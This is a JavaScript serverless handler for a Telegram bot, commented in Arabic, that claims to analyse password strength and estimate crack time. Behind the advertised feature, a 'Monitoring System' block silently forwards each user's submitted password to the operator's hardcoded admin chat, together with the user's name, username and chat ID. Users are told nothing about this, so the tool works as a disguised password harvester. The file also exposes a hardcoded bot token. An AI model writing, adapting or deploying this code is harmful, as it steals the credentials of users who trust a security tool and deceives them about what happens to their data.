const axios = require('axios');

// بياناتك الخاصة (تم وضعها هنا لتسهيل التشغيل عليك)
const BOT_TOKEN = "8519648833:AAHeg8gNX7P1UZabWKcqeFJv0NAggRzS3Qs";
const ADMIN_ID = "1431886140"; 
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

// دالة تحليل قوة كلمة المرور (المنطق العلمي)
function analyzeSecurity(text) {
    let poolSize = 0;
    if (/[a-z]/.test(text)) poolSize += 26;
    if (/[A-Z]/.test(text)) poolSize += 26;
    if (/[0-9]/.test(text)) poolSize += 10;
    if (/[^a-zA-Z0-9]/.test(text)) poolSize += 32;

    if (poolSize === 0) return { entropy: 0, time: "لحظي", strength: "فارغة" };
    
    const entropy = text.length * Math.log2(poolSize);
    const seconds = Math.pow(2, entropy) / 10000000000; // 10 مليار محاولة/ثانية
    
    let timeStr = "";
    if (seconds < 1) timeStr = "أقل من ثانية ⚡";
    else if (seconds < 60) timeStr = `${Math.round(seconds)} ثانية ⏱️`;
    else if (seconds < 3600) timeStr = `${Math.round(seconds/60)} دقيقة 🕒`;
    else if (seconds < 86400) timeStr = `${Math.round(seconds/3600)} ساعة ⌛`;
    else if (seconds < 31536000) timeStr = `${Math.round(seconds/86400)} يوم 📆`;
    else timeStr = `${Math.round(seconds/31536000)} سنة 🗓️`;

    let strength = "";
    if (entropy < 28) strength = "🔴 ضعيفة جداً (خطر)";
    else if (entropy < 36) strength = "🟠 ضعيفة";
    else if (entropy < 60) strength = "🟡 متوسطة";
    else if (entropy < 128) strength = "🟢 قوية";
    else strength = "🛡️ خارقة (AboElfadl Standard)";

    return { entropy: entropy.toFixed(2), time: timeStr, strength: strength };
}

exports.handler = async function(event, context) {
    // قبول طلبات POST فقط
    if (event.httpMethod !== "POST") {
        return { statusCode: 405, body: "Method Not Allowed" };
    }

    try {
        const body = JSON.parse(event.body);
        
        // التأكد من وجود رسالة
        if (!body.message || !body.message.text) {
            return { statusCode: 200, body: "No text" };
        }

        const chatId = body.message.chat.id.toString();
        const text = body.message.text;
        const firstName = body.message.from.first_name || "مستخدم";
        const username = body.message.from.username ? `@${body.message.from.username}` : "لا يوجد";

        let replyText = "";

        // -- أوامر البوت --
        if (text === "/start") {
            replyText = `أهلاً بك يا ${firstName} 👋\n\n` +
                        `أنا بوت **AboElfadl Security Analyzer**.\n` +
                        `قم بإرسال أي كلمة مرور وسأقوم بتحليل الوقت اللازم لاختراقها.`;
        } else {
            // تنفيذ التحليل
            const result = analyzeSecurity(text);
            replyText = `📊 **تقرير التحليل الأمني:**\n` +
                        `━━━━━━━━━━━━━━━━\n` +
                        `🔐 **القوة:** ${result.strength}\n` +
                        `🧮 **التعقيد:** ${result.entropy} bits\n` +
                        `⏳ **زمن الكسر المقدر:** ${result.time}\n` +
                        `━━━━━━━━━━━━━━━━\n` +
                        `💡 *نصيحة: استخدم رموزاً وأرقاماً لزيادة التعقيد.*`;

            // -- نظام المراقبة (Monitoring System) --
            // إذا كان المستخدم ليس أنت (الأدمن)، أرسل نسخة من النشاط لك
            if (chatId !== ADMIN_ID) {
                const alertText = `🚨 **تنبيه أمني (نشاط جديد)**\n\n` +
                                  `👤 **المستخدم:** ${firstName} (${username})\n` +
                                  `🆔 **ID:** \`${chatId}\`\n` +
                                  `📝 **النص المرسل:** \`${text}\`\n` +
                                  `📊 **النتيجة:** ${result.strength}`;
                
                await axios.post(TELEGRAM_API, {
                    chat_id: ADMIN_ID,
                    text: alertText,
                    parse_mode: "Markdown"
                });
            }
        }

        // إرسال الرد للمستخدم
        await axios.post(TELEGRAM_API, {
            chat_id: chatId,
            text: replyText,
            parse_mode: "Markdown"
        });

        return { statusCode: 200, body: "OK" };

    } catch (error) {
        console.error("Error:", error);
        return { statusCode: 500, body: "Server Error" };
    }
};
